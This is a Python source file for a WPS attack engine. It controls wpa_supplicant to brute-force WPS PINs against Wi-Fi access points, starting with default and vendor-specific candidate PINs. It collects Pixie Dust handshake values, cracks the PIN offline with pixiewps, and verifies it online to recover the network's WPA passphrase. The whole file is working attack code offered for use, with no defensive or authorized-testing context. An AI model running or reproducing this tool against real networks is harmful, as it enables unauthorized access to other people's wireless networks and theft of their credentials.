#!/usr/bin/env python3
"""
WPS Engine v3 - Direct wpa_supplicant controller
- Starts own wpa_supplicant instance
- WPS PIN / PBC attacks
- Pixie Dust data collection with smart PIN prioritization
- Auto-retry on failures
- Lock status detection (M2D, NACK)
"""

import os, re, time, socket, tempfile, subprocess, shutil, select, fcntl, threading, queue


class WpsEngine:
    """Direct wpa_supplicant controller for WPS attacks"""

    def __init__(self, interface):
        self.interface = interface
        self.wpas_process = None
        self.temp_dir = None
        self.temp_conf = None
        self.ctrl_path = None
        self.sock = None
        self.sock_file = None

        # Pixie Dust data
        self.pixie_data = {
            'PKE': '', 'PKR': '', 'E_NONCE': '', 'R_NONCE': '',
            'AUTHKEY': '', 'E_HASH1': '', 'E_HASH2': '', 'BSSID': '',
        }

        # Connection state
        self.state = {
            'status': '',
            'last_m': 0,
            'essid': '',
            'bssid': '',
            'wpa_psk': '',
            'is_locked': False,
            'attempted_pin': None,
            'verified_pin': None,
        }

        self.output_lines = []
        self.callback = None
        self._line_queue = queue.Queue()
        self._reader_thread = None
        self._reader_stop = threading.Event()

    # ═══════════════════════════════════════════
    # PROCESS MANAGEMENT
    # ═══════════════════════════════════════════

    def start(self):
        """Start own wpa_supplicant instance"""
        self.temp_dir = tempfile.mkdtemp(prefix='wps_engine_')

        # Create config
        self.temp_conf = os.path.join(self.temp_dir, 'wpa.conf')
        with open(self.temp_conf, 'w') as f:
            f.write('ctrl_interface=' + self.temp_dir + '\n')
            f.write('ctrl_interface_group=root\n')
            f.write('update_config=1\n')

        self.ctrl_path = os.path.join(self.temp_dir, self.interface)

        # Start wpa_supplicant
        cmd = [
            'wpa_supplicant', '-K', '-d',
            '-Dnl80211,wext',
            '-i' + self.interface,
            '-c' + self.temp_conf,
        ]

        try:
            self.wpas_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except FileNotFoundError:
            return False, 'wpa_supplicant not found'
        except Exception as e:
            return False, str(e)

        # Wait for control interface (max 5s)
        for _ in range(50):
            if os.path.exists(self.ctrl_path):
                break
            if self.wpas_process.poll() is not None:
                out = self.wpas_process.communicate()[0]
                return False, 'wpa_supplicant failed: ' + (out or '')[:200]
            time.sleep(0.1)
        else:
            return False, 'Control interface timeout'

        # Background reader: never block the WPS timeout loop on stdout.readline()
        self._reader_stop.clear()
        self._line_queue = queue.Queue()
        self._reader_thread = threading.Thread(
            target=self._stdout_reader_loop,
            name='wps-engine-stdout',
            daemon=True,
        )
        self._reader_thread.start()

        # Create Unix socket
        self.sock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.sock_file = tempfile.mktemp(dir=self.temp_dir)
        self.sock.bind(self.sock_file)
        self.sock.settimeout(2.0)

        return True, 'wpa_supplicant started'

    def stop(self):
        """Stop wpa_supplicant and cleanup"""
        try:
            self._reader_stop.set()
        except Exception:
            pass
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass

        if self.wpas_process:
            try:
                self._send('TERMINATE')
                self.wpas_process.wait(timeout=3)
            except Exception:
                try:
                    self.wpas_process.terminate()
                    self.wpas_process.wait(timeout=2)
                except Exception:
                    try:
                        self.wpas_process.kill()
                    except Exception:
                        pass

        if self.temp_dir and os.path.exists(self.temp_dir):
            shutil.rmtree(self.temp_dir, ignore_errors=True)

        self.wpas_process = None
        self.sock = None

    def is_alive(self):
        """Check if wpa_supplicant is still running"""
        if self.wpas_process:
            return self.wpas_process.poll() is None
        return False

    # ═══════════════════════════════════════════
    # SOCKET COMMUNICATION
    # ═══════════════════════════════════════════

    def _send(self, command):
        """Send command via Unix socket"""
        if self.sock and self.ctrl_path:
            try:
                self.sock.sendto(command.encode(), self.ctrl_path)
            except Exception:
                pass

    def _send_recv(self, command, timeout=3.0):
        """Send command and receive reply"""
        self._send(command)
        if self.sock:
            self.sock.settimeout(timeout)
            try:
                data, _ = self.sock.recvfrom(4096)
                return data.decode('utf-8', errors='replace')
            except socket.timeout:
                pass
            except Exception:
                pass
        return ''

    # ═══════════════════════════════════════════
    # OUTPUT PARSING
    # ═══════════════════════════════════════════

    def _stdout_reader_loop(self):
        """Continuously read wpa_supplicant stdout into a queue."""
        stream = None
        try:
            if self.wpas_process:
                stream = self.wpas_process.stdout
        except Exception:
            stream = None
        if not stream:
            return
        while not self._reader_stop.is_set():
            try:
                line = stream.readline()
            except Exception:
                break
            if line == '' or line is None:
                # EOF or transient empty
                if self.wpas_process and self.wpas_process.poll() is not None:
                    break
                time.sleep(0.05)
                continue
            try:
                self._line_queue.put(line.rstrip('\n'))
            except Exception:
                break

    def _read_line(self, wait=0.2):
        """Pop one line from the reader queue (never hangs the attack loop)."""
        try:
            return self._line_queue.get(timeout=max(0.01, float(wait)))
        except queue.Empty:
            return ''
        except Exception:
            return ''

    def _get_hex(self, line):
        """Extract hex data from wpa_supplicant -K debug lines."""
        if not line:
            return ''
        # Common: "label - hexdump(len=N): aa bb cc"
        m = re.search(r'hexdump\s*\(len=\d+\):\s*([0-9a-fA-F ]+)', line)
        if m:
            return m.group(1).replace(' ', '').upper()
        # Alternate: "label: aa bb cc" after last colon group
        m = re.search(r':\s*((?:[0-9a-fA-F]{2}\s*){8,})\s*$', line)
        if m:
            return m.group(1).replace(' ', '').upper()
        parts = line.split(':', 3)
        if len(parts) >= 3:
            cand = parts[-1].replace(' ', '').strip()
            # keep only hex chars
            cand = re.sub(r'[^0-9A-Fa-f]', '', cand)
            if len(cand) >= 16:
                return cand.upper()
        return ''

    def _handle_wps_message(self, line):
        """Parse WPS protocol messages (M1-M8, M2D, NACK, lock hints)."""
        ll = line.lower()

        if 'ap setup locked' in ll or 'setup locked' in ll or 'wps-ap-setup-locked' in ll:
            self.state['status'] = 'WPS_LOCKED'
            self.state['is_locked'] = True
            self._log('AP reports WPS setup locked')
            return False

        if 'm2d' in ll:
            self._log('Received WPS Message M2D')
            self.state['status'] = 'WPS_M2D'
            self._log('Registrar rejected or deferred the PIN session (M2D)')
            return False

        m = re.search(r'Building Message M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log('Sending WPS Message M{n}'.format(n=n))
            return True

        m = re.search(r'Received M(\d+)', line)
        if m:
            n = int(m.group(1))
            self.state['last_m'] = n
            self._log('Received WPS Message M{n}'.format(n=n))
            if n == 5:
                self._log('First half of PIN is VALID!')
            return True

        if 'received wsc_nack' in ll or 'wsc_nack' in ll:
            self.state['status'] = 'WSC_NACK'
            self._log('Received WSC NACK')
            self._log('PIN was rejected by the registrar')
            return False

        # Pixie field capture — match common wpa_supplicant -K labels
        if 'hexdump' in ll:
            if 'enrollee nonce' in ll or 'e-nonce' in ll or 'enonce' in ll:
                self._capture_pixie('E_NONCE', line, 32)
            elif 'registrar nonce' in ll or 'r-nonce' in ll or 'rnonce' in ll:
                self._capture_pixie('R_NONCE', line, 32)
            elif 'dh own public key' in ll or 'own dh public key' in ll:
                self._capture_pixie('PKR', line, 384)
            elif 'dh peer public key' in ll or 'peer dh public key' in ll:
                self._capture_pixie('PKE', line, 384)
            elif 'authkey' in ll or 'auth key' in ll:
                self._capture_pixie('AUTHKEY', line, 64)
            elif 'e-hash1' in ll or 'ehash1' in ll or 'hash1' in ll:
                self._capture_pixie('E_HASH1', line, 64)
            elif 'e-hash2' in ll or 'ehash2' in ll or 'hash2' in ll:
                self._capture_pixie('E_HASH2', line, 64)

        if 'network key' in ll and 'hexdump' in ll:
            self.state['status'] = 'GOT_PSK'
            self.state['verified_pin'] = self.state.get('attempted_pin')
            hex_val = self._get_hex(line)
            try:
                self.state['wpa_psk'] = bytes.fromhex(hex_val).decode('utf-8', errors='replace')
            except Exception:
                self.state['wpa_psk'] = hex_val
            self._log('PSK FOUND: {psk}'.format(psk=self.state['wpa_psk']))

        return True

    def _capture_pixie(self, attr, line, expected_len):
        """Capture Pixie Dust data from hexdump line"""
        hex_val = self._get_hex(line)
        if not hex_val:
            return

        # Be lenient with length
        if len(hex_val) > expected_len:
            hex_val = hex_val[:expected_len]
        elif len(hex_val) < expected_len and len(hex_val) > 0:
            hex_val = hex_val.zfill(expected_len)
        elif len(hex_val) == 0:
            return

        self.pixie_data[attr] = hex_val
        self._log('{attr}: {val}'.format(attr=attr, val=hex_val[:40] + ('...' if len(hex_val) > 40 else '')))

    def _handle_connection_state(self, line, pbc_mode=False):
        """Parse connection state changes."""
        ll = line.lower()

        if 'ap setup locked' in ll or 'setup locked' in ll or 'wps-ap-setup-locked' in ll:
            self.state['status'] = 'WPS_LOCKED'
            self.state['is_locked'] = True
            self._log('AP reports WPS setup locked')
            return False

        if 'state:' in ll and 'scanning' in ll:
            self.state['status'] = 'scanning'

        elif 'wps-fail' in ll:
            if not self.state.get('status'):
                self.state['status'] = 'WPS_FAIL'

        elif 'trying to authenticate' in ll:
            self.state['status'] = 'authenticating'
            if "'" in line:
                parts = line.split("'")
                if len(parts) >= 2:
                    self.state['essid'] = parts[1]

        elif 'associated with' in ll and self.interface in ll:
            bssid = line.split()[-1].upper()
            self.state['bssid'] = bssid

        elif 'wps-timeout' in ll:
            self.state['status'] = 'WPS_TIMEOUT'
            return False

        elif pbc_mode and 'selected bss' in ll:
            try:
                bssid = line.split('selected BSS ')[-1].split()[0].upper()
                self.state['bssid'] = bssid
            except Exception:
                pass

        return True

    def _log(self, message):
        """Log message and call callback"""
        self.output_lines.append(message)
        if self.callback:
            self.callback(message)

    def _process_line(self, line, pbc_mode=False):
        """Process one line of wpa_supplicant output"""
        if not line:
            return True

        stripped = line.strip()
        ll = stripped.lower()

        # Always try WPS handler for WPS-related lines (with or without "WPS: " prefix)
        is_wpsish = (
            stripped.startswith('WPS:')
            or stripped.startswith('WPS: ')
            or 'wps' in ll
            or 'hexdump' in ll
            or 'wsc_' in ll
            or 'm2d' in ll
            or re.search(r'\bM[1-8]\b', stripped) is not None
            or 'enrollee' in ll
            or 'registrar' in ll
            or 'authkey' in ll
            or 'e-hash' in ll
            or 'network key' in ll
        )
        if is_wpsish:
            cont = self._handle_wps_message(stripped)
            if cont is False:
                return False
            # still allow connection-state side effects
        return self._handle_connection_state(stripped, pbc_mode)

    # ═══════════════════════════════════════════
    # WPS OPERATIONS
    # ═══════════════════════════════════════════

    def wps_pin_attack(self, bssid, pin, timeout=60, clear_pixie=True):
        """Perform one WPS PIN attempt and return a normalized result.

        clear_pixie=False keeps previously collected Pixie Dust fields
        (needed when verifying a pin found by pixiewps).
        """
        if clear_pixie:
            for key in self.pixie_data:
                self.pixie_data[key] = ''
        self.state = {
            'status': '',
            'last_m': 0,
            'essid': '',
            'bssid': bssid.upper(),
            'wpa_psk': '',
            'is_locked': False,
            'attempted_pin': pin,
            'verified_pin': None,
        }
        # Keep prior debug lines when verifying after pixiewps; only reset on fresh PIN try
        if clear_pixie:
            self.output_lines = []
        self.pixie_data['BSSID'] = bssid.upper()

        cmd = 'WPS_REG {bssid} {pin}'.format(bssid=bssid, pin=pin)
        reply = self._send_recv(cmd)

        if 'OK' not in reply:
            self.state['status'] = 'WPS_FAIL'
            self._log('WPS_REG failed: {reply}'.format(reply=reply))
            return self._result()

        self._log('Trying PIN: {pin}'.format(pin=pin))

        start_time = time.time()
        last_progress = start_time
        while time.time() - start_time < timeout:
            if not self.is_alive():
                if not self.state.get('status'):
                    self.state['status'] = 'WPS_FAIL'
                    self._log('wpa_supplicant exited during WPS exchange')
                break
            line = self._read_line(wait=0.25)
            if not line:
                now = time.time()
                if now - last_progress >= 5:
                    elapsed = int(now - start_time)
                    self._log(
                        'Waiting for WPS messages... {elapsed}s '
                        '(last_m={m}, fields={fields})'.format(
                            elapsed=elapsed,
                            m=self.state.get('last_m', 0),
                            fields=sum(
                                1 for k, v in self.pixie_data.items()
                                if v and k != 'BSSID'
                            ),
                        )
                    )
                    last_progress = now
                continue
            if not self._process_line(line):
                break
            if self.state['status'] in (
                'WSC_NACK',
                'GOT_PSK',
                'WPS_FAIL',
                'WPS_M2D',
                'WPS_TIMEOUT',
                'WPS_LOCKED',
            ):
                break

        if not self.state.get('status'):
            self.state['status'] = 'WPS_TIMEOUT'
            self._log('WPS exchange timed out')

        self._send('WPS_CANCEL')
        return self._result()

    def wps_pbc_attack(self, bssid=None, timeout=120):
        """Perform WPS Push Button attack"""
        for k in self.pixie_data:
            self.pixie_data[k] = ''
        self.state = {
            'status': '',
            'last_m': 0,
            'essid': '',
            'bssid': bssid.upper() if bssid else '',
            'wpa_psk': '',
            'is_locked': False,
            'attempted_pin': 'PBC',
            'verified_pin': None,
        }
        self.output_lines = []

        cmd = 'WPS_PBC {bssid}'.format(bssid=bssid) if bssid else 'WPS_PBC'

        reply = self._send_recv(cmd)
        if 'OK' not in reply:
            self.state['status'] = 'WPS_FAIL'
            self._log('WPS_PBC failed: {r}'.format(r=reply))
            return self._result()

        self._log('WPS PBC started...')

        start_time = time.time()
        while time.time() - start_time < timeout:
            if not self.is_alive():
                break
            line = self._read_line()
            if not line:
                time.sleep(0.1)
                continue
            if not self._process_line(line, pbc_mode=True):
                break
            if self.state['status'] in ('GOT_PSK', 'WPS_FAIL'):
                break

        self._send('WPS_CANCEL')
        return self._result()

    def collect_pixie_data(self, bssid, max_attempts=8, skip_pins=None):
        """
        Collect Pixie Dust data for offline cracking.
        Tries smart PINs (from OUI analysis) first, then generic PINs.
        """
        # Smart PIN order: start with manufacturer-specific PINs
        pins = [
            '12345670', '00000000', '88888888', '11111111',
            '99999999', '12345678', '11223344', '00000001',
        ]

        # Try to get smart PINs for this BSSID
        try:
            from modules.wps_pins import suggest_pins
            smart_pins = suggest_pins(bssid)
            if smart_pins:
                # Use smart PINs instead of generic ones
                pins = [p['pin'] for p in smart_pins[:8]]
        except Exception:
            pass

        skip_set = set(skip_pins or [])
        filtered_pins = []
        for candidate_pin in pins:
            if candidate_pin in skip_set:
                continue
            filtered_pins.append(candidate_pin)
        if not filtered_pins:
            self._log('No pending PINs remain for Pixie Dust collection')
            return {
                'pin': None,
                'attempted_pin': None,
                'psk': None,
                'status': 'completed',
                'pixie_data': self.pixie_data.copy(),
                'collected_count': 0,
                'output': '\n'.join(self.output_lines),
                'attempts': [],
            }

        attempt_records = []
        collected_count = 0
        required_keys = [
            'PKE', 'PKR', 'E_NONCE', 'R_NONCE', 'AUTHKEY', 'E_HASH1', 'E_HASH2',
        ]

        def _count_fields():
            return sum(
                1 for key in required_keys if self.pixie_data.get(key)
            )

        for i, pin in enumerate(filtered_pins[:max_attempts]):
            collected_count = _count_fields()
            # Enough for pixiewps when we have core fields
            if (
                self.pixie_data.get('PKE')
                and self.pixie_data.get('E_HASH1')
                and self.pixie_data.get('E_HASH2')
                and self.pixie_data.get('AUTHKEY')
                and self.pixie_data.get('E_NONCE')
            ):
                self._log(
                    'Enough data collected ({c}/7)'.format(c=collected_count)
                )
                break

            self._log('Collecting data with PIN: {pin} ({i}/{n})'.format(
                pin=pin, i=i + 1, n=min(max_attempts, len(filtered_pins))
            ))

            old_data = self.pixie_data.copy()
            started = time.time()
            # 45s gives weak-signal APs time to finish M1-M4
            result = self.wps_pin_attack(
                bssid, pin, timeout=45, clear_pixie=True
            )
            elapsed = time.time() - started
            attempt_records.append({
                'pin': pin,
                'status': result.get('status', 'unknown'),
                'response': result.get('output', '')[-500:],
                'duration': elapsed,
            })

            # Merge: never lose previously collected pixie fields
            for key in required_keys + ['BSSID']:
                new_val = self.pixie_data.get(key) or ''
                old_val = old_data.get(key) or ''
                if not new_val and old_val:
                    self.pixie_data[key] = old_val

            collected_count = _count_fields()
            self._log(
                'Fields after attempt: {c}/7 ({fields})'.format(
                    c=collected_count,
                    fields=', '.join(
                        k for k in required_keys if self.pixie_data.get(k)
                    ) or 'none',
                )
            )

            if self.state.get('status') == 'GOT_PSK' or result.get('status') == 'success':
                result = result if isinstance(result, dict) else {}
                result['attempts'] = list(attempt_records)
                result['pixie_data'] = self.pixie_data.copy()
                return result

            # Stop early on hard lock
            if result.get('status') in ('locked',) or self.state.get('is_locked'):
                self._log('WPS locked — stopping Pixie collection')
                break

        # Count collected fields
        collected = [k for k, v in self.pixie_data.items() if v and k != 'BSSID']
        collected_count = len(collected)

        self._log('Collected: {fields} ({n}/7)'.format(
            fields=', '.join(collected), n=collected_count))

        # Try pixiewps if we have enough data
        pixie = self.pixie_data
        if collected_count >= 4 and pixie.get('PKE'):
            self._log('Running pixiewps...')
            import shutil as shutil_mod
            if shutil_mod.which('pixiewps'):
                cmd = [
                    'pixiewps',
                    '--pke', pixie.get('PKE', ''),
                    '--pkr', pixie.get('PKR', ''),
                    '--e-hash1', pixie.get('E_HASH1', ''),
                    '--e-hash2', pixie.get('E_HASH2', ''),
                    '--authkey', pixie.get('AUTHKEY', ''),
                    '--e-nonce', pixie.get('E_NONCE', ''),
                    '--r-nonce', pixie.get('R_NONCE', ''),
                    '--e-bssid', bssid.replace(':', ''),
                    '--mode', '1,2,3,4,5',
                ]
                # Remove empty args
                cmd = [c for c in cmd if c and len(c) > 2]

                try:
                    # Snapshot pixie fields BEFORE any verify attempt
                    pixie_snapshot = self.pixie_data.copy()
                    r = subprocess.run(
                        cmd, capture_output=True, text=True, timeout=120
                    )
                    for line in (r.stdout or '').split('\n'):
                        self._log(line)
                    for line in (r.stderr or '').split('\n'):
                        if line.strip():
                            self._log(line)

                    cracked_pin = None
                    for line in (r.stdout or '').split('\n'):
                        if 'WPS pin' in line and '[+]' in line:
                            candidate = line.split(':')[-1].strip()
                            if candidate and candidate != '<empty>' and candidate.isdigit():
                                cracked_pin = candidate
                                break

                    if cracked_pin:
                        self._log('PIXIEWPS PIN: {p}'.format(p=cracked_pin))
                        self._log(
                            'Verifying PIN online (keeping Pixie snapshot)...'
                        )
                        # Restore snapshot in case anything mutated it
                        self.pixie_data = pixie_snapshot.copy()
                        verify_started = time.time()
                        verify_result = self.wps_pin_attack(
                            bssid,
                            cracked_pin,
                            timeout=60,
                            clear_pixie=False,
                        )
                        verify_elapsed = time.time() - verify_started
                        # Always restore pixie snapshot after verify
                        self.pixie_data = pixie_snapshot.copy()
                        attempt_records.append({
                            'pin': cracked_pin,
                            'status': verify_result.get('status', 'unknown'),
                            'response': verify_result.get('output', '')[-500:],
                            'duration': verify_elapsed,
                        })
                        if verify_result.get('status') == 'success':
                            verify_result['attempts'] = list(attempt_records)
                            verify_result['pixie_data'] = pixie_snapshot.copy()
                            verify_result['pixie_pin'] = cracked_pin
                            return verify_result

                        # PIN found offline but online verify failed
                        # (weak signal / lock / timeout) — still return it
                        self._log(
                            'PIN {p} found by pixiewps but online verify '
                            'did not return PSK (status={st}). '
                            'Retry PIN attack when signal is stronger.'.format(
                                p=cracked_pin,
                                st=verify_result.get('status'),
                            )
                        )
                        return {
                            'pin': cracked_pin,
                            'attempted_pin': cracked_pin,
                            'psk': None,
                            'status': 'pixie_pin_unverified',
                            'pixie_data': pixie_snapshot.copy(),
                            'collected_count': collected_count,
                            'output': '\n'.join(self.output_lines),
                            'attempts': attempt_records,
                            'pixie_pin': cracked_pin,
                            'verify_status': verify_result.get('status'),
                        }

                    combined = (r.stdout or '') + '\n' + (r.stderr or '')
                    if (
                        collected_count >= 7
                        and (
                            'WPS pin not found' in combined
                            or '[-] WPS pin not found' in combined
                        )
                    ):
                        return {
                            'pin': None,
                            'attempted_pin': None,
                            'psk': None,
                            'status': 'pixie_not_vulnerable',
                            'pixie_data': self.pixie_data.copy(),
                            'collected_count': collected_count,
                            'output': '\n'.join(self.output_lines),
                            'attempts': attempt_records,
                        }
                except Exception as e:
                    self._log('pixiewps error: {e}'.format(e=str(e)))
            else:
                self._log('pixiewps not installed')

        return {
            'pin': None,
            'attempted_pin': None,
            'psk': None,
            'status': 'data_collected',
            'pixie_data': self.pixie_data.copy(),
            'collected_count': collected_count,
            'output': '\n'.join(self.output_lines),
            'attempts': attempt_records,
        }

    def _result(self):
        """Build a normalized result dict."""
        status = self._map_status()
        psk = self.state.get('wpa_psk') if status == 'success' else None
        pin = None
        if status == 'success' and psk:
            pin = self.state.get('verified_pin') or self.state.get('attempted_pin')
        return {
            'pin': pin,
            'attempted_pin': self.state.get('attempted_pin'),
            'psk': psk,
            'status': status,
            'pixie_data': self.pixie_data.copy(),
            'essid': self.state.get('essid'),
            'is_locked': self.state.get('is_locked'),
            'last_m': self.state.get('last_m'),
            'output': '\n'.join(self.output_lines),
        }

    def _map_status(self):
        """Map internal status to result status."""
        status = self.state.get('status', '')
        if status == 'GOT_PSK':
            return 'success'
        if status == 'WPS_M2D':
            return 'm2d_rejected'
        if status == 'WSC_NACK':
            return 'wrong_pin'
        if status == 'WPS_LOCKED':
            return 'locked'
        if status == 'WPS_FAIL':
            return 'failed'
        if status == 'WPS_TIMEOUT':
            return 'timeout'
        if self.state.get('is_locked'):
            return 'locked'
        return 'completed'

    # ═══════════════════════════════════════════
    # SCAN VIA WPA_SUPPLICANT
    # ═══════════════════════════════════════════

    def scan(self):
        """Trigger scan via wpa_supplicant"""
        reply = self._send_recv('SCAN')
        return 'OK' in reply

    def get_scan_results(self):
        """Get scan results from wpa_supplicant"""
        reply = self._send_recv('SCAN_RESULTS', timeout=5)
        networks = []

        for line in reply.split('\n'):
            if line.startswith('bssid') or not line.strip():
                continue
            parts = line.split('\t')
            if len(parts) < 5:
                continue

            bssid = parts[0].strip().upper()
            if not re.match(r'^([0-9A-F]{2}:){5}[0-9A-F]{2}$', bssid):
                continue

            freq = parts[1].strip()
            signal = parts[2].strip()
            flags = parts[3].strip()
            ssid = parts[4].strip() if len(parts) > 4 else ''

            enc = 'Open'
            has_wps = 0
            if '[WPA-PSK' in flags:
                enc = 'WPA'
            if '[WPA2-PSK' in flags:
                enc = 'WPA2'
            if '[WPA3-SAE' in flags:
                enc = 'WPA3'
            if '[WPS]' in flags:
                has_wps = 1

            ch = 0
            try:
                f = int(freq)
                if 2412 <= f <= 2484:
                    ch = 14 if f == 2484 else (f - 2412) // 5 + 1
                elif 5170 <= f <= 5825:
                    ch = (f - 5170) // 5 + 34
            except (ValueError, TypeError):
                pass

            networks.append({
                'bssid': bssid,
                'essid': ssid or 'Hidden',
                'channel': ch,
                'frequency': int(freq) if freq.isdigit() else 0,
                'rssi': int(signal) if signal.lstrip('-').isdigit() else 0,
                'has_wps': has_wps,
                'wps_locked': 'Unknown', 'wps_version': '',
                'wps_device': '', 'wps_model': '',
                'encryption': enc, 'cipher': '', 'auth': '',
                'source': 'wpa_engine',
            })

        networks.sort(key=lambda x: x['rssi'], reverse=True)
        return networks

    # ═══════════════════════════════════════════
    # NETWORK MANAGEMENT
    # ═══════════════════════════════════════════

    def add_network(self, ssid, psk=None):
        """Add network via socket"""
        reply = self._send_recv('ADD_NETWORK')
        net_id = reply.strip()
        if not net_id.isdigit():
            return None

        self._send_recv('SET_NETWORK {n} ssid "{ssid}"'.format(n=net_id, ssid=ssid))
        if psk:
            self._send_recv('SET_NETWORK {n} psk "{psk}"'.format(n=net_id, psk=psk))
            self._send_recv('SET_NETWORK {n} key_mgmt WPA-PSK'.format(n=net_id))
        else:
            self._send_recv('SET_NETWORK {n} key_mgmt NONE'.format(n=net_id))

        self._send_recv('SELECT_NETWORK {n}'.format(n=net_id))
        self._send_recv('ENABLE_NETWORK {n}'.format(n=net_id))
        self._send_recv('SAVE_CONFIG')
        return int(net_id)

    def get_status(self):
        """Get connection status via socket"""
        reply = self._send_recv('STATUS')
        info = {}
        for line in reply.split('\n'):
            if '=' in line:
                k, v = line.split('=', 1)
                info[k.strip()] = v.strip()
        return info

    def disconnect(self):
        self._send_recv('DISCONNECT')

    def reconnect(self):
        self._send_recv('RECONNECT')

    def list_networks(self):
        """List saved networks"""
        reply = self._send_recv('LIST_NETWORKS')
        networks = []
        for line in reply.split('\n')[1:]:
            parts = line.split('\t')
            if len(parts) >= 2:
                networks.append({
                    'id': parts[0],
                    'ssid': parts[1],
                    'bssid': parts[2] if len(parts) > 2 else 'any',
                })
        return networks
